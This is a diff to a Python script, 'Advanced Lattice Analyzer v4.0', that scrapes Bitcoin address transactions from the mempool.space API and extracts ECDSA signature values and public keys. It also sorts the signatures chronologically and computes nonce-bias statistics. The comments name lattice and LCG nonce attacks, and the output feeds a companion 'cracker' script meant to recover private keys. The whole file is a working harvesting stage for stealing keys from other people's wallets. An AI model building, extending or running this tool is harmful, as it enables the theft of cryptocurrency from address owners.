@@ -3,7 +3,7 @@ from typing import List, Dict, Any, Optional, Tuple
 from collections import defaultdict, Counter
 
 # ==============================================================================
-# CONFIG & GLOBALS
+# CONFIG & GLOBALS  (ADVANCED EDITION)
 # ==============================================================================
 MEMPOOL_API_TXS = "https://mempool.space/api/address/{address}/txs?limit={limit}&offset={offset}"
 BATCH_SIZE = 25
@@ -14,8 +14,9 @@ MAX_TRANSACTIONS = 0
 EXIT_FLAG = False
 STARTED_SCANNING = False
 SESSION = requests.Session()
-SESSION.headers.update({"User-Agent": "LatticeAnalyzer-Mempool/2.1"})
+SESSION.headers.update({"User-Agent": "AdvancedLatticeAnalyzer/4.0"})
 
+# Lowered from 7 to 4: advanced attacks (LCG, GCD) can work with fewer sigs
 MIN_SIGS_REQUIRED = 4
 FINGERPRINTS_FOUND: Dict[str, set] = defaultdict(set)
 
@@ -51,8 +52,10 @@ B58_CHARS = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
 def b58decode(s: str) -> bytes:
     n = 0
     for c in s:
+        if c not in B58_CHARS:
+            raise ValueError("Invalid Base58 char")
         n = n * 58 + B58_CHARS.index(c)
-    res = n.to_bytes(25, 'big')
+    res = n.to_bytes((n.bit_length() + 7) // 8 or 1, 'big')
     pad = 0
     for c in s:
         if c == '1': pad += 1
@@ -154,6 +157,7 @@ def varint(n: int) -> bytes:
     else: return b'\xff' + n.to_bytes(8, 'little')
 
 def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
+    if sighash_flag != 1: return None
     try:
         from hashlib import sha256
         def dsha(b): return sha256(sha256(b).digest()).digest()
@@ -169,7 +173,7 @@ def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optiona
             vout_n = int(inp.get("vout", 0))
             ser += prev_txid + vout_n.to_bytes(4, "little")
             if i == vin_idx:
-                script_pubkey = inp.get("prevout", {}).get("scriptpubkey", "")
+                script_pubkey = (inp.get("prevout") or {}).get("scriptpubkey", "")
                 script_bytes = bytes.fromhex(script_pubkey)
                 ser += varint(len(script_bytes)) + script_bytes
             else:
@@ -188,13 +192,14 @@ def compute_legacy_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optiona
     except Exception: return None
 
 def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
+    if sighash_flag != 1: return None
     try:
         from hashlib import sha256
         def dsha(b): return sha256(sha256(b).digest()).digest()
 
         vins = tx.get("vin", [])
         txin = vins[vin_idx]
-        prevout = txin.get("prevout", {})
+        prevout = txin.get("prevout") or {}
         
         version = int(tx.get("version", 2))
         locktime = int(tx.get("locktime", 0))
@@ -239,36 +244,54 @@ def compute_bip143_sighash(tx: dict, vin_idx: int, sighash_flag: int) -> Optiona
 def compute_sighash_z(tx: dict, vin_idx: int, sighash_flag: int) -> Optional[int]:
     vins = tx.get("vin", [])
     if vin_idx >= len(vins): return None
-    prevout = vins[vin_idx].get("prevout", {})
+    prevout = vins[vin_idx].get("prevout") or {}
     input_type = prevout.get("scriptpubkey_type", prevout.get("type", "unknown"))
     if input_type in ["v0_p2wpkh", "p2wpkh", "p2sh-p2wpkh", "witness_v0_keyhash"]:
         return compute_bip143_sighash(tx, vin_idx, sighash_flag)
-    return compute_legacy_sighash(tx, vin_idx, sighash_flag)
+    elif input_type in ["p2pkh", "pubkeyhash"]:
+        return compute_legacy_sighash(tx, vin_idx, sighash_flag)
+    return None
 
 def parse_der_sig(sig_hex: str) -> Optional[Tuple[int, int, int]]:
     try:
-        i = sig_hex.find("30")
-        if i == -1: return None
-        i0 = i + 2
-        _seq_len = int(sig_hex[i0:i0+2], 16); i0 += 2
-        if sig_hex[i0:i0+2] != "02": return None
-        i0 += 2
-        r_len = int(sig_hex[i0:i0+2], 16); i0 += 2
-        r_hex = sig_hex[i0:i0 + 2*r_len]; i0 += 2*r_len
-        if sig_hex[i0:i0+2] != "02": return None
-        i0 += 2
-        s_len = int(sig_hex[i0:i0+2], 16); i0 += 2
-        s_hex = sig_hex[i0:i0 + 2*s_len]; i0 += 2*s_len
-        sighash_hex = sig_hex[i0:i0+2]
-        return (int(r_hex, 16), int(s_hex, 16), int(sighash_hex, 16) if sighash_hex else 1)
+        hex_str = sig_hex.lower()
+        idx = hex_str.find("30")
+        while idx != -1:
+            try:
+                i0 = idx + 2
+                seq_len = int(hex_str[i0:i0+2], 16); i0 += 2
+                if hex_str[i0:i0+2] != "02":
+                    idx = hex_str.find("30", idx + 2)
+                    continue
+                i0 += 2
+                r_len = int(hex_str[i0:i0+2], 16); i0 += 2
+                r_hex = hex_str[i0:i0 + 2*r_len]; i0 += 2*r_len
+                if hex_str[i0:i0+2] != "02":
+                    idx = hex_str.find("30", idx + 2)
+                    continue
+                i0 += 2
+                s_len = int(hex_str[i0:i0+2], 16); i0 += 2
+                s_hex = hex_str[i0:i0 + 2*s_len]; i0 += 2*s_len
+                if seq_len != 2 + r_len + 2 + s_len or i0 > len(hex_str):
+                    idx = hex_str.find("30", idx + 2)
+                    continue
+                sighash_flag = int(hex_str[i0:i0+2], 16) if i0 + 2 <= len(hex_str) else 1
+                return (int(r_hex, 16), int(s_hex, 16), sighash_flag)
+            except Exception:
+                idx = hex_str.find("30", idx + 2)
+        return None
     except Exception: return None
 
 def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
     if not script_hex: return None
     hexstr = script_hex.lower()
-    cands = re.findall(r'04[0-9a-f]{128}', hexstr) + re.findall(r'(?:02|03)[0-9a-f]{64}', hexstr)
-    if not cands: return None
-    return max(cands, key=lambda c: hexstr.rfind(c))
+    match = re.search(r'(?:^|[0-9a-f]{2})41(04[0-9a-f]{128})$', hexstr)
+    if match: return match.group(1)
+    match = re.search(r'(?:^|[0-9a-f]{2})21((?:02|03)[0-9a-f]{64})$', hexstr)
+    if match: return match.group(1)
+    cands = re.findall(r'41(04[0-9a-f]{128})', hexstr) + re.findall(r'21((?:02|03)[0-9a-f]{64})', hexstr)
+    if cands: return cands[-1]
+    return None
 
 # ==============================================================================
 # SENDER-ONLY FILTERING
@@ -309,7 +332,7 @@ def b58encode(data: bytes) -> str:
 
 def is_input_from_address(txin: dict, target_address: str) -> bool:
     """Check if this transaction input was spent FROM our target address."""
-    prevout = txin.get("prevout", {})
+    prevout = txin.get("prevout") or {}
     # The API conveniently provides the address in prevout
     prevout_addr = prevout.get("scriptpubkey_address", "")
     if prevout_addr == target_address:
@@ -360,7 +383,7 @@ def detect_historic_fingerprints(tx: dict) -> List[str]:
     # 6. SegWit Check
     is_legacy = True
     for inp in tx.get("vin", []):
-        itype = inp.get("prevout", {}).get("scriptpubkey_type", "")
+        itype = (inp.get("prevout") or {}).get("scriptpubkey_type", "")
         if "wpkh" in itype or "taproot" in itype:
             is_legacy = False
             
@@ -373,13 +396,19 @@ def analyze_address(address: str):
     print(f"\n[*] Scanning: {address}")
     txs = fetch_all_transactions(address)
     
-    unique_sigs = {}
+    unique_sigs_by_pubkey = defaultdict(dict)
     pubkey_counter = Counter()
     sig_count = 0
+    # Global chronological order counter for signature ordering
+    sig_order_counter = 0
     
     for tx_idx, tx in enumerate(txs):
+        # Extract block_height for chronological ordering (critical for LCG attack)
+        tx_status = tx.get("status", {})
+        block_height = tx_status.get("block_height", 9999999)
+        
         for vin_idx, txin in enumerate(tx.get("vin", [])):
-            # IMPROVEMENT: Only extract signatures from inputs belonging to OUR target address
+            # Only extract signatures from inputs belonging to OUR target address
             if not is_input_from_address(txin, address):
                 continue
             
@@ -404,7 +433,6 @@ def analyze_address(address: str):
             
             if z is not None:
                 pubkey_lower = pubkey.lower()
-                pubkey_counter[pubkey_lower] += 1
                 
                 # Check for historic footprints
                 tx_fingerprints = detect_historic_fingerprints(tx)
@@ -412,11 +440,18 @@ def analyze_address(address: str):
                     FINGERPRINTS_FOUND[address].add(f)
                     
                 key = (r, s, z)
-                if key not in unique_sigs:
-                    unique_sigs[key] = {
-                        "r": hex(r), "s": hex(s), "z": hex(z), "txid": tx.get("txid", "")
+                if key not in unique_sigs_by_pubkey[pubkey_lower]:
+                    unique_sigs_by_pubkey[pubkey_lower][key] = {
+                        "r": hex(r), "s": hex(s), "z": hex(z),
+                        "txid": tx.get("txid", ""),
+                        # NEW: Chronological metadata for LCG / Sequential attacks
+                        "block_height": block_height,
+                        "sig_order": sig_order_counter,
+                        "vin_idx": vin_idx,
                     }
+                    sig_order_counter += 1
                     sig_count += 1
+                    pubkey_counter[pubkey_lower] += 1
         
         # Progress indicator every 50 transactions
         if (tx_idx + 1) % 50 == 0:
@@ -425,42 +460,83 @@ def analyze_address(address: str):
     if len(pubkey_counter) >= 50:
         print()  # newline after progress
     
-    # Use the MOST FREQUENT pubkey (not just the last one seen)
+    # Use the MOST FREQUENT pubkey
     if pubkey_counter:
         primary_pubkey = pubkey_counter.most_common(1)[0][0]
+        unique_sigs = unique_sigs_by_pubkey[primary_pubkey]
     else:
         primary_pubkey = "Unknown"
+        unique_sigs = {}
                 
-    print(f"  -> Extracted {len(unique_sigs)} valid signatures (from {len(pubkey_counter)} unique pubkeys).")
+    print(f"  -> Extracted {len(unique_sigs)} signatures for primary pubkey (from {len(pubkey_counter)} unique pubkeys).")
     
     if len(pubkey_counter) > 1:
         top = pubkey_counter.most_common(1)[0]
         print(f"  -> [WARNING] Multiple pubkeys detected! Using most frequent ({top[1]} sigs).")
 
-    # Prepare Save
-    os.makedirs(os.path.join("reports", "pass"), exist_ok=True)
-    os.makedirs(os.path.join("reports", "fail"), exist_ok=True)
+    # ===== SORT SIGNATURES CHRONOLOGICALLY (critical for LCG Phantom attack) =====
+    sig_list = list(unique_sigs.values())
+    sig_list.sort(key=lambda x: (x.get("block_height", 9999999), x.get("sig_order", 0)))
+    
+    # ===== NONCE BIAS PRE-ANALYSIS (helps Filtered Lattice + Signature Filtering) =====
+    bias_stats = []
+    for sig in sig_list:
+        r_val = int(sig['r'], 16)
+        s_val = int(sig['s'], 16)
+        r_bits = r_val.bit_length()
+        s_bits = s_val.bit_length()
+        r_hex = hex(r_val)[2:].zfill(64)
+        leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
+        bias_stats.append({
+            "r_bits": r_bits, "s_bits": s_bits, "r_leading_zeros": leading_zeros,
+        })
+    
+    # Summary stats
+    if bias_stats:
+        avg_r_bits = sum(b["r_bits"] for b in bias_stats) / len(bias_stats)
+        min_r_bits = min(b["r_bits"] for b in bias_stats)
+        max_leading_zeros = max(b["r_leading_zeros"] for b in bias_stats)
+        low_r_count = sum(1 for b in bias_stats if b["r_bits"] < 248)
+    else:
+        avg_r_bits = min_r_bits = max_leading_zeros = low_r_count = 0
+
+    # Prepare Save — use script directory for reports
+    _script_dir = os.path.dirname(os.path.abspath(__file__))
+    os.makedirs(os.path.join(_script_dir, "reports", "pass"), exist_ok=True)
+    os.makedirs(os.path.join(_script_dir, "reports", "fail"), exist_ok=True)
     
     fingerprints_list = list(FINGERPRINTS_FOUND.get(address, set()))
     data = {
         "address": address,
         "pubkey": primary_pubkey,
         "historic_fingerprints": fingerprints_list,
-        "signature_count": len(unique_sigs),
-        "signatures": list(unique_sigs.values())
+        "signature_count": len(sig_list),
+        "signatures": sig_list,  # Chronologically sorted!
+        # NEW: Bias pre-analysis summary for the cracker
+        "bias_stats": {
+            "avg_r_bits": round(avg_r_bits, 1),
+            "min_r_bits": min_r_bits,
+            "max_r_leading_zeros": max_leading_zeros,
+            "low_r_count": low_r_count,
+            "chronologically_sorted": True,
+        }
     }
     
     if fingerprints_list:
         print(f"  -> Historic Fingerprints: {', '.join(fingerprints_list)}")
     
-    if len(unique_sigs) >= MIN_SIGS_REQUIRED:
-        filepath = os.path.join("reports", "pass", f"{address}.json")
+    # Bias warning
+    if low_r_count > 0:
+        print(f"  -> [BIAS] {low_r_count} sigs with small r (<248 bits), min r_bits={min_r_bits}")
+    
+    if len(sig_list) >= MIN_SIGS_REQUIRED:
+        filepath = os.path.join(_script_dir, "reports", "pass", f"{address}.json")
         with open(filepath, "w") as f:
             json.dump(data, f, indent=4)
-        print(f"  [+] PASSED: {len(unique_sigs)} signatures (min: {MIN_SIGS_REQUIRED})")
+        print(f"  [+] PASSED: {len(sig_list)} signatures (min: {MIN_SIGS_REQUIRED}) [chronologically sorted]")
         print(f"  -> Saved: {filepath}")
     else:
-        print(f"  [-] SKIPPED: Only {len(unique_sigs)} signatures (need {MIN_SIGS_REQUIRED})")
+        print(f"  [-] SKIPPED: Only {len(sig_list)} signatures (need {MIN_SIGS_REQUIRED})")
 
 # ==============================================================================
 # MAIN
@@ -468,7 +544,8 @@ def analyze_address(address: str):
 def main():
     global MAX_TRANSACTIONS
     print("===================================================================")
-    print("              BIASED NONCE LATTICE ANALYZER v3.0                   ")
+    print("    ADVANCED LATTICE ANALYZER v4.0 (for Advanced Cracker v2.0)     ")
+    print("    Chronological ordering | Bias pre-analysis | Min 4 sigs       ")
     print("===================================================================")
     
     while True:
@@ -510,10 +587,11 @@ def main():
     if invalid_count > 0:
         print(f"  -> Skipped {invalid_count} invalid addresses.")
     
-    # Resume support: skip already-scanned addresses
+    _sd = os.path.dirname(os.path.abspath(__file__))
+    _pass_dir = os.path.join(_sd, "reports", "pass")
     already_done = set()
-    if os.path.isdir("reports/pass"):
-        for f in os.listdir("reports/pass"):
+    if os.path.isdir(_pass_dir):
+        for f in os.listdir(_pass_dir):
             if f.endswith(".json"):
                 already_done.add(f.replace(".json", ""))
     
@@ -532,12 +610,13 @@ def main():
         analyze_address(addr)
 
     print("\n" + "="*60)
-    print("ANALYSIS COMPLETE!")
+    print("ADVANCED ANALYSIS COMPLETE!")
     
-    pass_count = len([f for f in os.listdir("reports/pass") if f.endswith(".json")]) if os.path.isdir("reports/pass") else 0
+    pass_count = len([f for f in os.listdir(_pass_dir) if f.endswith(".json")]) if os.path.isdir(_pass_dir) else 0
     
-    print(f"Results: {pass_count} PASSED")
-    print("Run `sage lattice_cracker.sage.py` next!")
+    print(f"Results: {pass_count} PASSED (min {MIN_SIGS_REQUIRED} sigs)")
+    print("Signatures are CHRONOLOGICALLY SORTED for LCG/Sequential detection.")
+    print("Run: sage advanced_attacks/advanced_cracker.sage.py")
     print("="*60)
 
 if __name__ == "__main__":
